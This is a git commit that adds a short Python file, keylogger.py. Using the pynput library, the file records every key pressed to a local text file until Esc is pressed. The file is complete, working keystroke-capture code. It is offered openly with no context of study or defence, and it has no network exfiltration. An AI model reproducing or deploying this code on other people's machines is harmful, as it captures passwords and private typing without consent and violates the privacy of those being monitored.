a8f393a627f66c94548d1e38a10903171dda852d
Ultron Patil <ultronpatil@gmail.com>
2024-06-03 11:34:44 +0530

    first commit

---
+++ keylogger.py
@@ -0,0 +1,21 @@
+from pynput import keyboard
+
+# File where logs will be saved
+log_file = "key_log.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open(log_file, "a") as f:
+            f.write(f"{key}")
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+
+# Collect events until released
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
